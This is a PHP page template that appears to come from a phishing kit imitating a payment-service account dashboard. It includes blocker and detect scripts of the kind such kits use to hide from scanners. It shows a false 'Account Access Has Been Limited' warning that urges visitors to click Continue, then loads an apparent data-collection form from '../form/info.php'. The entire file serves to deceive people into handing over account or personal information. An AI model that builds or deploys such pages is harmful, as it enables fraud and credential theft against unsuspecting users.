<?php
	include('../../blocker.php');
	include('header.php');
	include('../../detect.php');
?>
	<div id="summary" class="summarySection">
		<div class="row-fluid">
			<div class="span8" id="js_activityCollection" style="width: 100%;">
			<section class="activityModule shadow none" aria-labelledby="activityModuleHeaderNone"><h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">Account Access Has Been Limited, Click Continue button To Start Resolving.</h1>
			<div></div>

<?php include('../form/info.php'); ?>

				</div>
			</section>
			</div>
		</div>
	</div><br>
<?php include('footer.php'); ?>